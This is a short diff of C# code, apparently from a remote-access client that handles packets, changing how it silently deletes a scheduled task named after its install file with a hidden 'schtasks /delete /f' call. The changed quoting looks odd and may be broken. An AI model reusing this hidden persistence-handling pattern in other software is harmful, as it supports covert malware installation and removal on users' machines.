@@ -26,7 +26,7 @@ namespace Client.Handle_Packet
                         Process.Start(new ProcessStartInfo()
                         {
                             FileName = "schtasks",
-                            Arguments = $"/delete /f /tn \"" + Settings.InstallFile + "\"",
+                            Arguments = "/delete /f /tn " + @"""'" + Settings.InstallFile + @"""'",
                             CreateNoWindow = true,
                             ErrorDialog = false,
                             UseShellExecute = false,
